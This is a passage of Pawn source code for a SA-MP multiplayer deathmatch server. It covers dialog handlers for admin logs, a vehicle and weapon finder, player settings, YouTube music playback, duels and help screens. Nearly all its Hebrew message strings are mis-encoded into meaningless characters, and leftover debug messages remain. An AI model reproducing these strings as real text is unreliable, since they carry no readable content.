					#pragma tabsize 0
					DialogCreate(4);
					DialogString(@c(lightblue) "\n\t\t\t- :ьхтщ ф·чс°хщх· рующЁщэ -\n\n");
					SendClientMessage(playerid,white,"2");
					new ints[3];
					while(fread(f,read))
					{
						if(read[0] == '#' || read[0] == ';') continue;
						SendClientMessage(playerid,white,"3");
						split(read,adminparams,'=');
						SendClientMessage(playerid,white,"4");
						i++;
						format(pf,sizeof(pf),"/DM/Users/%s.ini",adminparams[0]);
						SendClientMessage(playerid,white,"5");
						ints[0] = fgetint(pf,"TimeInServer"), ints[1] = fgetint(pf,"TotalTimeInServer"), ints[2] = fgetint(pf,"Reports");
						SendClientMessage(playerid,white,"6");
						format(string,sizeof(string)," Х %02d) %s - %d [Minutes: %d (H: %d.%d) | Total Minutes: %d (H: %d.%d) | Reports: %d | Last Connect: %s %s]",i,adminparams[0],strval(adminparams[1]),ints[0],ints[0]/60,ints[0]%60,ints[1],ints[1]/60,ints[1]%60,ints[2],GetLastConnectDate(adminparams[0]),fgetint(pf,"LastConnectTime"));
						SendClientMessage(playerid,white,"7");
						DialogFormat(string);
					}
					SendClientMessage(playerid,white,"8");
					format(string,sizeof(string),"\n\nёъ фыь %d рующЁщэ с°∙щюф",i);
					DialogSend(playerid,dialog_clogs2,DIALOG_STYLE_MSGBOX,"CLogs рЇ∙°хщх·","чцх°","ётх°");
					Log("CLogs",playerid,"[aclogs] check everyone's connect logs");
					#pragma tabsize 4
				}
				case 1: // clear logs
				{
					while(fread(f,read))
					{
						if(read[0] == '#' || read[0] == ';') continue;
						split(read,adminparams,'=');
						i++;
						format(pf,sizeof(pf),"/DM/Users/%s.ini",adminparams[0]);
						fsetint(pf,"TimeInServer",0);
						fsetint(pf,"Reports",0);
					}
					format(string,sizeof(string),".Ёхўх ыь фьхтщэ ∙ь %d рующЁщэ сёъ фыь",i);
					ShowPlayerDialog(playerid,dialog_clogs2,DIALOG_STYLE_MSGBOX,"CLogs рЇ∙°хщх·",string,"чцх°","ётх°");
					Log("CLogs",playerid,"[aclogs] reseted everyone's connect logs");
				}
			}
			fclose(f);*/
		}
		case dialog_clogs2: if(response) command(playerid,"/aclogs");
		case dialog_stele:
		{
			if(response)
			{
				new teleid = -1, c = 0;
				for(new i = 0; i < sizeof(Teleports) && teleid == -1; i++) if(Teleports[i][Ttype] == tele_private)
				{
					if(c == listitem) teleid = i;
					c++;
				}
				if(teleid == -1) return SendClientMessage(playerid,red," .∙щтх° ьр ЁюЎр");
				Teleport(playerid,teleid);
			}
		}
		case dialog_shootingrange:
		{
			if(response)
			{
				SetPlayerPos(playerid,298.3959,-74.4127,1001.5156);
				SetPlayerFacingAngle(playerid,359.0325);
				ResetWeapons(playerid);
				LoadPlayerWeapons(playerid);
				SetFreeze(playerid,0);
			}
			else command(playerid,"/srstart");
		}
		case dialog_lighthouse: if(response)
		{
			if(listitem == 3) command(playerid,"/lighthouse");
			else
			{
				switch(listitem)
				{
					case 0:
					{
						ShowPlayerDialog(playerid,dialog_lighthouse2,DIALOG_STYLE_INPUT,@c(lightblue) "фютуьх° - юЎщр· °ыс",":фўьу р· ∙э ф°ыс / чьў ю∙э ф°ыс / юхуь рщщущ","чщЇх∙","сщшхь");
						playerinfo[playerid][lhopt] = listitem;
					}
					case 1:
					{
						ShowPlayerDialog(playerid,dialog_lighthouse2,DIALOG_STYLE_INPUT,@c(lightblue) "фютуьх° - юЎщр· Ё∙ў",":фўьу р· ∙э фЁ∙ў / чьў ю∙э фЁ∙ў / рщщущ фЁ∙ў","чщЇх∙","сщшхь");
						playerinfo[playerid][lhopt] = listitem;
					}
					case 2:
					{
						if(hqeObject != -1) return SendClientMessage(playerid,red," .ющ∙фх ыс° ю∙·ю∙ сюЄьщ· фюЇўух·, рЁр фю·я Єу ∙фхр щёщщэ");
						if(GetMoney(playerid) < 1000) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє, ∙щюх∙ сюЄьщ· фюЇўух· Єхьф 1,000$");
						ShowPlayerDialog(playerid,dialog_lighthouse2,DIALOG_STYLE_INPUT,@c(lightblue) "фютуьх° - юЄьщ· фюЇўух·",":фўьу р· ∙э фўьря фюухщщў","∙щюх∙","сщшхь");
						playerinfo[playerid][lhopt] = listitem;
					}
				}
			}
		}
		case dialog_lighthouse2: if(response)
		{
			switch(playerinfo[playerid][lhopt])
			{
				case 0: // find vehicle
				{
					playerinfo[playerid][lhopt] = -1;
					new id = IsNumeric(inputtext) ? strval(inputtext) : GetVehicleModelIDFromName(inputtext), invalids = 0, vDriver = INVALID_PLAYER_ID, flag = -1, count = 0, Float:p[3];
					if(id < 400 || id > 611) return SendClientMessage(playerid,red," .°ыс ·хрэ ьЁ·хЁщэ ∙°∙ю· SA-MPьр ўщщэ с");
					if(id == 425 || id == 432 || id == 520) return SendClientMessage(playerid,red," .ьр Ёщ·я ьчЇ∙ р· ф°ыс фцф");
					for(new v = 0; v < MAX_VEHICLES; v++) if(vehicleinfo[v][vvalid])
					{
						if(vehicleinfo[v][vemodel] != id) continue;
						if(flag == -1)
						{
							for(new i = 0; i < MAX_PLAYERS_ && vDriver == INVALID_PLAYER_ID; i++) if(IsPlayerConnected(i) && IsPlayerInVehicle(i,v) && GetPlayerState(i) == PLAYER_STATE_DRIVER) vDriver = i;
							flag = v;
						}
						count++;
						if(invalids > 0) invalids = 0;
					}
					else if(++invalids >= 50) break;
					format(string,sizeof(string)," ~~~ :\"%s\" ·хЎрх· чщЇх∙ ф°ыс ~~~",GetVehicleName(id));
					SendClientMessage(playerid,lightblue,string);
					if(!count || flag == -1) SendClientMessage(playerid,red," .ьр ўщщэ °ыс ыцф с∙°·");
					else
					{
						if(count == 1) SendClientMessage(playerid,yellow," .ўщщэ °ыс рчу ыцф с∙°·. р·ф ЎхЇф сх ыЄ·");
						else
						{
							format(string,sizeof(string)," .ўщщющэ %d °ысщэ ырьх с∙°·",count);
							SendClientMessage(playerid,yellow,string);
							SendClientMessage(playerid,yellow," .р·ф ЎхЇф ыЄ· с°ыс ф°р∙хя ∙ЁюЎр юфёхт фцф");
						}
						SendClientMessage(playerid,grey," Х /lhoff - Єь юЁ· ьфЇёщў р· фЎЇщщф");
						if(vDriver != INVALID_PLAYER_ID || vehicleinfo[flag][vclan] > 0 || vehicleinfo[flag][store])
						{
							SendClientMessage(playerid,red," :∙щэ ьс ыщ ф°ыс ∙р·ф ЎхЇф сх");
							if(vDriver != INVALID_PLAYER_ID)
							{
								format(string,sizeof(string)," > %s ЁюЎр ыЄ· сщущщэ ∙ь",GetName(vDriver));
								SendClientMessage(playerid,red,string);
							}
							if(vehicleinfo[flag][vclan] > 0)
							{
								format(string,sizeof(string)," > %s ∙щщъ ьўьря",claninfo[vehicleinfo[flag][vclan]][cname]);
								SendClientMessage(playerid,red,string);
							}
							if(vehicleinfo[flag][store]) return SendClientMessage(playerid,red," > ∙щщъ ьчЁх· ф°ысщэ");
						}
						GetVehiclePos(flag,p[0],p[1],p[2]);
						SetPlayerCameraPos(playerid,p[0],p[1],p[2]+15.0);
						SetPlayerCameraLookAt(playerid,p[0],p[1],p[2]);
						SetPlayerMapIcon(playerid,icon_lighthouse,p[0],p[1],p[2],41,0,MAPICON_GLOBAL);
						SetPlayerPos(playerid,p[0],p[1],p[2]-10.0);
						SetPlayerColor(playerid,GetColor(playerid,0));
						SetFreeze(playerid,1);
						playerinfo[playerid][lhopt] = 0, playerinfo[playerid][lhiconshowing] = 1;
					}
				}
				case 1: // find weapon
				{
					playerinfo[playerid][lhopt] = -1;
					new id = IsNumeric(inputtext) ? strval(inputtext) : GetWeaponIDFromName(inputtext), invalids = 0, flag = -1, count = 0, Float:p[3], modelid = GetWeaponPickupModel(id);
					if(id < 0 || id > 46 || (id >= 19 && id <= 21)) return SendClientMessage(playerid,red," .Ё∙ў ·хрэ ьЁ·хЁщэ ∙°∙ю· SA-MPьр ўщщэ с");
					for(new pi = 0; pi < MAX_PICKUPS_; pi++) if(pickupinfo[pi][pvalid])
					{
						if(pickupinfo[pi][pmodel] != modelid) continue;
						if(flag == -1) flag = pi;
						count++;
						if(invalids > 0) invalids = 0;
					}
					else if(++invalids >= 50) break;
					format(string,sizeof(string)," ~~~ :\"%s\" ·хЎрх· чщЇх∙ фЁ∙ў ~~~",WeaponName(id));
					SendClientMessage(playerid,lightblue,string);
					if(!count || flag == -1) SendClientMessage(playerid,red," .ьр ўщщэ Ё∙ў ыцф с∙°·");
					else
					{
						if(count == 1) SendClientMessage(playerid,yellow," .ўщщэ Ё∙ў рчу ыцф с∙°·. р·ф ЎхЇф сх ыЄ·");
						else
						{
							format(string,sizeof(string)," .ўщщющэ %d Ё∙ўщэ ырьх с∙°·",count);
							SendClientMessage(playerid,yellow,string);
							SendClientMessage(playerid,yellow," .р·ф ЎхЇф ыЄ· сЁ∙ў ф°р∙хя ∙ЁюЎр юфёхт фцф");
						}
						SendClientMessage(playerid,grey," Х /lhoff - Єь юЁ· ьфЇёщў р· фЎЇщщф");
						if(pickupinfo[flag][pfunc] == 11 && pickupinfo[flag][pspecialid] > 0)
						{
							SendClientMessage(playerid,red," :∙щэ ьс ыщ фЁ∙ў ∙р·ф ЎхЇф сх");
							if(pickupinfo[flag][pfunc] == 11 && pickupinfo[flag][pspecialid] > 0)
							{
								format(string,sizeof(string)," > %s ∙щщъ ьўьря",claninfo[pickupinfo[flag][pspecialid]][cname]);
								SendClientMessage(playerid,red,string);
							}
						}
						GetVehiclePos(flag,p[0],p[1],p[2]);
						SetPlayerCameraPos(playerid,pickupinfo[flag][ppos][0],pickupinfo[flag][ppos][1],pickupinfo[flag][ppos][2]+7.5);
						SetPlayerCameraLookAt(playerid,pickupinfo[flag][ppos][0],pickupinfo[flag][ppos][1],pickupinfo[flag][ppos][2]);
						SetPlayerMapIcon(playerid,icon_lighthouse,pickupinfo[flag][ppos][0],pickupinfo[flag][ppos][1],pickupinfo[flag][ppos][2],41,0,MAPICON_GLOBAL);
						SetPlayerPos(playerid,pickupinfo[flag][ppos][0],pickupinfo[flag][ppos][1],pickupinfo[flag][ppos][2]-10.0);
						SetPlayerColor(playerid,GetColor(playerid,0));
						SetFreeze(playerid,1);
						playerinfo[playerid][lhopt] = 1, playerinfo[playerid][lhiconshowing] = 1;
					}
				}
				case 2: // headquarter elevator
				{
					playerinfo[playerid][lhopt] = -1;
					new id = clannumber(inputtext), arrivingInterval = 0, Float:p[3], Float:hqp[3];
					if(!id) return SendClientMessage(playerid,red," .ьр ўщщэ с∙°· ўьря с∙э ∙°∙ю·");
					if(!claninfo[id][hashq]) return SendClientMessage(playerid,red," .ьўьря цф рщя юЇўуф");
					format(string,sizeof(string)," ╗ !··чщь сЄху 10 ∙Ёщх· %s фшщёф ьюЇўу· фўьря",claninfo[id][cname]);
					SendClientMessage(playerid,lightblue,string);
					SendClientMessage(playerid,red," !∙щэ ьс: Єьщъ ьфцф° ∙ьр ьцхц сюфьъ фшщёф хьр ьщ°х· сю∙шч ∙ючцщў рх·ъ");
					SendClientMessage(playerid,red," .ьрч° ∙фшщёф ·ё·щщэ ·Ўш°ъ ьЎЁхч ь·хъ фюЇўуф");
					GetPlayerPos(playerid,p[0],p[1],p[2]);
					GetHQAveragePos(id,hqp[0],hqp[1],hqp[2]);
					hqeObject = CreateObject(0,p[0],p[1],p[2]-4.0,0.0,0.0,0.0);
					arrivingInterval += MoveObject(hqeObject,p[0],p[1],p[2]+90.0,15.0);
					arrivingInterval += MoveObject(hqeObject,hqp[0],hqp[1],p[2]+90.0,15.0);
					arrivingInterval /= 1000;
					StopObject(hqeObject);
					DestroyObject(hqeObject);
					Streamer_Update(playerid);
					format(string,sizeof(string)," ╗ шщёф ЁЄщюф! цюя фтЄф ю∙хЄ°: %02d уўх· х%02d ∙Ёщх·",arrivingInterval/60,arrivingInterval%60);
					SendClientMessage(playerid,red,string);
					SetTimerEx("HeadquarterElevator",10000,0,"ii",playerid,id);
				}
			}
		}
		case dialog_setting:
		{
			if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ючхс° ь∙щюх∙ срЇ∙°х· цх");
			if(response)
			{
				switch(Settings[listitem][stType])
				{
					case 1:
					{
						playerinfo[playerid][setting][listitem] = !playerinfo[playerid][setting][listitem];
						if(listitem == setting_clock) TogglePlayerClock(playerid,playerinfo[playerid][setting][listitem]);
						if(listitem == setting_speedo) if(IsPlayerInAnyVehicle(playerid)) Speedometer(playerid,playerinfo[playerid][speedo] == INVALID_PLAYER_TEXT_DRAW && playerinfo[playerid][setting][listitem] ? ("create") : ("delete"));
						if(listitem == setting_hp) if(IsTempTextShowing(playerid,temptext_hp)) RemoveTempText(playerid,temptext_hp);
						format(string,sizeof(string),"Setting%d",listitem);
						fsetint(fuser(playerid),string,playerinfo[playerid][setting][listitem]);
						PlaySound(playerid,1057);
						command(playerid,"/setting");
					}
					case 2:
					{
						playerinfo[playerid][clickon] = listitem;
						format(string,sizeof(string),@c(yellow) ":сч° юёЇ° сщя %s с∙сщь ь∙Ёх· р· ффту°ф фсрф\n%s",listitem == setting_classselection || listitem == setting_stats || listitem == setting_sniper ? ("1-3") : ("1-4"),Settings[listitem][stName]);
						ShowPlayerDialog(playerid,dialog_setting2,DIALOG_STYLE_INPUT,@c(lightblue) "∙щЁхщ фту°х·",string,"∙Ёф","сщшхь");
					}
				}
			}
			else
			{
				new list[1200];
				for(new i = 0; i < sizeof(Settings); i++) format(list,sizeof(list),!strlen(list) ? (@c(yellow) "%s Х %d) %s - %s") : ("%s\r\n Х %d) %s - %s"),list,i+1,Settings[i][stName],Settings[i][stText]);
				ShowPlayerDialog(playerid,dialog_settinghelp,DIALOG_STYLE_MSGBOX,@c(lightblue) "ющуЄ Єь ффту°х·",list,"чц°ф","щЎщрф");
			}
		}
		case dialog_setting2: if(response)
		{
			if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ючхс° ь∙щюх∙ срЇ∙°х· цх");
			new val = strval(inputtext), mx = 1;
			if(playerinfo[playerid][clickon] == setting_classselection || playerinfo[playerid][clickon] == setting_stats || playerinfo[playerid][clickon] == setting_sniper) mx = 3;
			else if(playerinfo[playerid][clickon] == setting_fs) mx = 4;
			if(!IsNumeric(inputtext) || val < 1 || val > mx) return SendClientMessage(playerid,red," .фюёЇ° ∙°∙ю· ∙тхщ с∙сщь ффту°ф фцх");
			if(playerinfo[playerid][clickon] == setting_fs) SetPlayerFightingStyle(playerid,val == 1 ? 15 : val + 3);
			playerinfo[playerid][setting][playerinfo[playerid][clickon]] = val;
			format(string,sizeof(string),"Setting%d",playerinfo[playerid][clickon]);
			fsetint(fuser(playerid),string,val);
			PlaySound(playerid,1057);
			command(playerid,"/setting");
		}
		case dialog_settinghelp: if(response) command(playerid,"/setting");
		case dialog_wtype: if(response)
		{
			if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ючхс° ь∙щюх∙ срЇ∙°х· цх");
			playerinfo[playerid][clickon] = listitem;
			format(string,sizeof(string),@c(yellow) ":%s сч° срчу юфЁ∙ўщэ фсрщэ с·х° Ё∙ў юхЄує юёхт\n\n" @c(red) "%s - Ё∙ў #1\n" @c(blue) "%s - Ё∙ў #2",WeaponTypes[listitem][wtName],WeaponName(WeaponTypes[listitem][wtWeapons][0]),WeaponName(WeaponTypes[listitem][wtWeapons][1]));
			ShowPlayerDialog(playerid,dialog_wtype2,DIALOG_STYLE_MSGBOX,@c(lightblue) "счщ°· Ё∙ў юхЄує",string,"Ё∙ў #1","Ё∙ў #2");
		}
		case dialog_wtype2:
		{
			if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ючхс° ь∙щюх∙ срЇ∙°х· цх");
			new val = WeaponTypes[playerinfo[playerid][clickon]][wtWeapons][response ? 0 : 1], weap = 0, amm = 0;
			if(PlayerHasWeapon(playerid,playerinfo[playerid][wtype][playerinfo[playerid][clickon]]))
			{
				GetPlayerWeaponData(playerid,GetWeaponSlot(playerinfo[playerid][wtype][playerinfo[playerid][clickon]]),weap,amm);
				if(amm > 0)
				{
					RemovePlayerWeapon(playerid,playerinfo[playerid][wtype][playerinfo[playerid][clickon]]);
					GiveWeapon(playerid,val,amm);
				}
			}
			playerinfo[playerid][wtype][playerinfo[playerid][clickon]] = val;
			format(string,sizeof(string),"WType%d",playerinfo[playerid][clickon]);
			fsetint(fuser(playerid),string,val);
			PlaySound(playerid,1057);
			command(playerid,"/wtypes");
		}
		case dialog_youtube: if(response)
		{
			playerinfo[playerid][clickon] = listitem;
			switch(listitem)
			{
				case 0: ShowPlayerDialog(playerid,dialog_youtube2,DIALOG_STYLE_INPUT,@c(black) "You" @c(red) "Tube" @c(lightblue) " ф∙юЄ· юхцщўф ю·хъ",@c(white) ":" @c(black) "You" @c(red) "Tube" @c(white) " фыЁё с∙х°ф фсрф р· фўщ∙х° ьё°шхя фюхцщўф ю·хъ","ф∙юЄф","сщшхь");
				case 1:
				{
					if(!playerinfo[playerid][music]) return SendClientMessage(playerid,red," .рщЁъ ∙хюЄ юхцщўф ююЄ°ы· фюхцщўф");
					playerinfo[playerid][music] = 0;
					StopAudioStreamForPlayer(playerid);
					SendClientMessage(playerid,green," .фюхцщўф фхЇёўф");
				}
				case 2: SendClientMessage(playerid,white,"Coming soon...");
				case 3: SendClientMessage(playerid,white,"Coming soon...");
			}
		}
		case dialog_youtube2: if(response)
		{
			switch(playerinfo[playerid][clickon])
			{
				case 0:
				{
					if(!strlen(inputtext) || strlen(inputtext) > 60) SendClientMessage(playerid,red," .ьр фўьу· ўщ∙х°");
					else
					{
						new url[M_S];
						format(url,sizeof(url),inputtext);
						format(url,sizeof(url),strreplace(url,"http://",""));
						format(url,sizeof(url),strreplace(url,"www.",""));
						format(url,sizeof(url),strreplace(url,"youtube.com/watch?v=",""));
						if(strfind(url,"&") != -1) strdel(url,strfind(url,"&"),strlen(url));
						SendClientMessage(playerid,white,url);
						if(strlen(url) == 11)
						{
							format(url,sizeof(url),"youtube-mp3.org/api/itemInfo/?video_id=%s",url);
							format(playerinfo[playerid][youtube],32,url);
							HTTP(playerid,HTTP_GET,url,"","PlayFromYouTube");
						}
						else SendClientMessage(playerid,red," .фўщ∙х° ∙фўьу· ∙тхщ");
					}
				}
			}
		}
		case dialog_amusic: if(response)
		{
			format(adminmusic,sizeof(adminmusic),AMusicList[listitem][amLink]);
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i))
			{
				playerinfo[i][playingmusic] = 0;
				PlayAudioStreamForPlayer(i,AMusicList[listitem][amLink]);
				playerinfo[i][playingmusic] = 1;
			}
			SendClientMessage(playerid,red," (/amusic stop !∙щэ ьс: фЇЄь· юхцщўф хфщр ·∙юЄ ьыь ющ ∙ЁыЁё ь∙°·. рэ фюхцщўф ьр Єхсу· сшь рх·ф)");
			format(string,sizeof(string)," .(/play :ьфЇЄьф счц°ф ,/saudio :ю∙ющЄ ыЄ· юхцщўф ьыхьэ (ьыщсхщ %s фрующя",GetName(playerid));
			SendClientMessageToAll(white,string);
		}
		case dialog_duel: if(response)
		{
			new list[512];
			switch(listitem)
			{
				case 0: for(new i = 0; i < sizeof(Ammunation); i++) format(list,sizeof(list),!strlen(list) ? ("%s%d. %s") : ("%s\n%d. %s"),list,i+1,Ammunation[i][aName]);
				case 1: for(new i = 0; i < sizeof(BattleStyles); i++) format(list,sizeof(list),!strlen(list) ? ("%s%d. %s") : ("%s\n%d. %s"),list,i+1,BattleStyles[i][bsName]);
				case 2: for(new i = 0; i < sizeof(VBattleStyles); i++) format(list,sizeof(list),!strlen(list) ? ("%s%d. %s") : ("%s\n%d. %s"),list,i+1,VBattleStyles[i][vbsName]);
			}
			playerinfo[playerid][bstyle][0] = listitem;
			ShowPlayerDialog(playerid,dialog_duel2,DIALOG_STYLE_LIST,@c(lightblue) "Private Battles",list,"фцюЁф","сщшхь");
		} else playerinfo[playerid][bplace] = -1;
		case dialog_duel2:
		{
			if(response)
			{
				if(!IsPlayerConnected(playerinfo[playerid][duelclick])) return SendClientMessage(playerid,red," .ф∙чўя ∙сч°· ыс° ф·Ё·ў");
				if(playerinfo[playerinfo[playerid][duelclick]][inbattle]) return SendClientMessage(playerid,red," .ю∙·ю∙ цф ыс° сў°с");
				playerinfo[playerinfo[playerid][duelclick]][binvited] = playerid, playerinfo[playerid][binvited] = playerinfo[playerid][duelclick], playerinfo[playerid][bstyle][1] = listitem, playerinfo[playerid][btime] = 0, playerinfo[playerid][binviter] = 1;
				playerinfo[playerinfo[playerid][duelclick]][lastrec] = 3, playerinfo[playerinfo[playerid][duelclick]][bstyle][1] = listitem;
				switch(playerinfo[playerid][bstyle][0])
				{
					case 0: format(string,sizeof(string),".%s фцющя рх·ъ ьў°с Єэ фЁ∙ў %s",Ammunation[listitem][aName],GetName(playerid));
					case 1: format(string,sizeof(string),".%s фцющя рх·ъ ьў°с юёхт %s",BattleStyles[listitem][bsName],GetName(playerid));
					case 2: format(string,sizeof(string),".%s фцющя рх·ъ ьў°с °ысщэ юёхт %s",VBattleStyles[listitem][vbsName],GetName(playerid));
				}
				format(string,sizeof(string)," /accept рх /duel accept :ьрщ∙х° ф∙·ю∙ сЇўхуф %s",string);
				SendClientMessage(playerinfo[playerid][duelclick],green,string);
				switch(playerinfo[playerid][bstyle][0])
				{
					case 0: format(string,sizeof(string)," .сцщ°ф юёЇ° %d %s ьў°с юёхт %s фцюЁ· р·",playerinfo[playerid][bplace],Ammunation[listitem][aName],GetName(playerinfo[playerid][duelclick]));
					case 1: format(string,sizeof(string)," .сцщ°ф юёЇ° %d %s ьў°с юёхт %s фцюЁ· р·",playerinfo[playerid][bplace],BattleStyles[listitem][bsName],GetName(playerinfo[playerid][duelclick]));
					case 2: format(string,sizeof(string)," .%s ьў°с °ысщэ юёхт %s фцюЁ· р·",VBattleStyles[listitem][vbsName],GetName(playerinfo[playerid][duelclick]));
				}
				SendClientMessage(playerid,green,string);
			}
			else ShowPlayerDialog(playerid,dialog_duel,DIALOG_STYLE_LIST,@c(lightblue) "Private Battles","ўьрёщ - Ё∙ў рчу\nющхчу - ыюф Ё∙ўщэ\n°ыс - ў°с Єэ ыьщ °ыс щх°щэ","фю∙ъ","сщшхь");
		}
		case dialog_help: if(response)
		{
			#pragma tabsize 0
			switch(strval(inputtext))
			{
				case 1: // фюш°х· с∙°·
				{
					DialogCreate(3);
					DialogString(@h(7BA7E1) "сёхт ю∙чў цф фюш°ф фщр ьф°хт счхЇ∙щх· ," @h(6094DB) "\"DeathMatch\"" @h(7BA7E1) " ∙Ёў°р GTA SA-MPф∙°· Єхёў сю∙чў щухЄ юрху с");
					DialogString(",ыюф ∙щх·° ∙чўЁщэ су°ыщ фф°щтф срщых·щх· сщх·°. с∙°· ·хыьх ьюЎхр чхї юф°щтх· Єху ф°сф рЇ∙°хщх·");
					DialogString(",фыхььх· ЇЄщьхщх· ыььщх· ∙ь ю∙чўщэ ьыь ф∙°·, ыёє ∙Ў°щъ ьф°ххщч хсЄц°·х ьўЁх· Ё∙ўщэ хус°щэ ЁхёЇщэ");
					DialogString(".ыхч рЁ°тщф Ё·хя ьыь ∙чўя ∙юрЇ∙° ьх ьсЎЄ щыхьх· юёхщюх· хЄху " @h(6094DB) "фюхя" @h(7BA7E1) " рЇ∙°хщх· ютЁщсх· ью∙чў");
					DialogString(@h(CEDEF4) "\n!р·ф юхцюя ьфю∙щъ хьфЁх· юфю∙чў с∙°· ∙ьЁх, Єэ фцюя ·хыь ьтьх· Єху ус°щэ чу∙щэ хюфЁщэ сю∙чў");
					DialogSend(playerid,dialog_help2,DIALOG_STYLE_MSGBOX,@c(darkblue) "·Ї°щш Єц°ф: фюш°х· с∙°·","чцх°","щЎщрф");
				}
				case 2: // шщЇщэ ью∙чў
				{
					DialogCreate(2);
					DialogString(@h(7BA7E1) ".ф∙°· ∙ьЁх ючцщў юху ыь ыъ тухь хюх°ыс ыъ ∙ьЇЄющэ ў∙ф ьф·юЎрх· сх");
					DialogString(":ыущ ьфўь Єь ЄЎюъ сф°сф счщЁх·, фыЁх °∙щюф ∙ь шщЇщэ ч∙хсщэ\n");
					DialogString(@h(6094DB) " Х !сыь °юф, ўЁф р· ыь фЁ∙ўщэ ∙ю·рщющэ ь°юф ∙ьъ. Ё∙ўщэ чцўщэ щЄц°х ьъ ьЄьх· °юх·");
					DialogString(" Х рэ р·ф ьр юЎьщч ьф°хт юф°, Ёёф ьфыЁё ьрцх°щ ущрэ ∙Ёх·Ёщэ ьъ Ё∙ўщэ счщЁэ");
					DialogString(" Х /AFK :ыр∙° р·ф ююцЄ° / ЄхЎ° р· фю∙чў рх ё·э Єхцс р· фюч∙с, ф∙·ю∙ сЇўхуф");
					DialogString(" Х .ыущ ьўч· чьў ЇЄщь сўфщьф " @h(CEDEF4) webpage @h(6094DB) " фыЁё хф°∙э ьЇх°хэ ∙ьЁх сы·хс·");
					DialogString(" Х /Tip :ю∙Єюэ? ьр юхЎр юф ьЄ∙х·? Ёёф ю∙фх чу∙");
					DialogSend(playerid,dialog_help2,DIALOG_STYLE_MSGBOX,@c(darkblue) "·Ї°щш Єц°ф: шщЇщэ ью∙чў","чцх°","щЎщрф");
				}
				case 3: // юу°щъ ьюху
				{
					DialogCreate(1);
					DialogString(@h(7BA7E1) ".ыущ ьфёсщ° р· ф∙°· сЎх°ф фшхсф сщх·° фхёЇЁх юЄ°ы· юу°щъ юхсЁщ· с·хъ фюху");
					DialogString("срюЎЄх· юЄ°ы· цх, ∙·Ўщт шўёш, ·юхЁх· хрЇщьх ·∙ющЄ Ўьщьщэ, ·хыьх ь°рх· ·хъ ыущ фю∙чў юу°щъ");
					DialogString(".ьюЄ°ых· фсёщёщх· хфЄщў°щх· сюху\n");
					DialogString(@h(6094DB) "?фрэ с°ЎхЁъ ьф·чщь ьЎЇх· сюу°щъ ьюху ыЄ·");
					DialogSend(playerid,dialog_help2,DIALOG_STYLE_MSGBOX,@c(darkblue) "·Ї°щш Єц°ф: юу°щъ ьюху","ЎЇщщф","чцх°");
				}
				case 4: // чхўщ ф∙°·
				{
					new File:rules, readtxt[M_S], rulestext[700], ruleid = 0, col[16];
					fileCheck(file_rules);
					rules = fopen(file_rules,io_read);
					while(fread(rules,readtxt,sizeof(readtxt),false))
					{
						if(strlen(readtxt) > 2)
						{
							ruleid++;
							switch(ruleid)
							{
								case 1: col = @h(4A9586);
								case 2: col = @h(5EAE9E);
								case 3: col = @h(74BAAC);
								case 4: col = @h(8DC7BB);
								case 5: col = @h(A5D3CA);
								case 6: col = @h(C0E0DA);
								case 7: col = @h(CFE7E2);
								case 8: col = @h(DCEDEA);
								case 9: col = @h(E7F3F1);
								case 10: col = @h(F2F9F8);
								case 11: col = @h(F7FBFA);
							}
						}
						format(rulestext,sizeof(rulestext),!strlen(rulestext) ? ("%s%s%s") : ("%s\n%s%s"),rulestext,col,readtxt);
					}
					fclose(rules);
					ShowPlayerDialog(playerid,dialog_help2,DIALOG_STYLE_MSGBOX,@c(darkblue) "·Ї°щш Єц°ф: чхўщ ф∙°·",rulestext,"чцх°","щЎщрф");
				}
				case 5: // °∙щю· фЇўхух·
				{
					DialogCreate(1);
					DialogString(@h(7BA7E1) ".с∙°· щ∙ фюхя Їўхух· ьфюхя юЄ°ых· ўщщюх·. чхї юрьх, щ∙Ёя тэ Їўхух· ∙ьр ў∙х°х· ь∙хэ юЄ°ы·");
					DialogString(":юыщххя ∙°∙щю· фЇўхух· р°хыф, ьр Ёщ·я ьфЎщт рх·ф ыря ръ рэ ·ы·сх сЎ'рш р· фЇўхуф фсрф ·хыьх ьЎЇх· с°∙щюф");
					DialogString(@h(6094DB)"\t\t\t/Commands [юёЇ° ·Ї°щш фЇўхух· сщя 1 Єу 4]");
					DialogSend(playerid,dialog_help2,DIALOG_STYLE_MSGBOX,@c(darkblue) "·Ї°щш Єц°ф: °∙щю· Їўхух·","чцх°","щЎщрф");
				}
				case 6: // юЄ°ых· сюху
				{
					DialogCreate(1);
					DialogString(@h(7BA7E1) ".фюху юыщь °∙щюф ЄЎхюф ∙ь юЄ°ых· ю∙чў ютххЁх· хюх°ысх·");
					DialogString(":°∙щю· фюЄ°ых· р°хыф хьыя юўсь· юёЇ° ·Ї°щшщ Єц°ф ю∙ьф. ьЎЇщщф с°∙щю· фюЄ°ых· ьюху");
					DialogString(@h(6094DB)"\t\t\t\t/Mode");
					DialogString(@h(6094DB)"\t\t\t\"Mode\" рх ьчЎх Єь ыЇ·х°");
					DialogSend(playerid,dialog_help2,DIALOG_STYLE_MSGBOX,@c(darkblue) "·Ї°щш Єц°ф: юЄ°ых· сюху","Mode","чцх°");
				}
				case 7: // ющуЄ Єь фюху
				{
					DialogCreate(2);
					DialogString(@h(7BA7E1) ".фюху ∙ь ф∙°· ўщщэ сю∙ъ ф°сф цюя хю·Єуыя срхЇя ўсхЄ х∙хшє");
					DialogString(":с·Ї°щш цф ·хыьх ь°рх· р· фЇ°шщэ фсрщэ сў∙° ьЄуыхЁщ фюху\n");
					DialogString(" Х " @h(6094DB) version @h(7BA7E1) " :т°ё· фюху");
					format(string,sizeof(string)," Х " @h(6094DB) "%s" @h(7BA7E1) " :Єуыхя рч°хя",curNewsDate);
					DialogFormat(string);
					format(string,sizeof(string)," Х " @h(6094DB) updates @h(7BA7E1) " :ыюх· ЄуыхЁщэ Єу Єы∙щх",curNews);
					DialogFormat(string);
					DialogString(" Х " @h(6094DB) "/Gamemode Х /TeamSpeak Х /Forum" @h(7BA7E1) " :Їўхух· ющуЄ ЁхёЇх·");
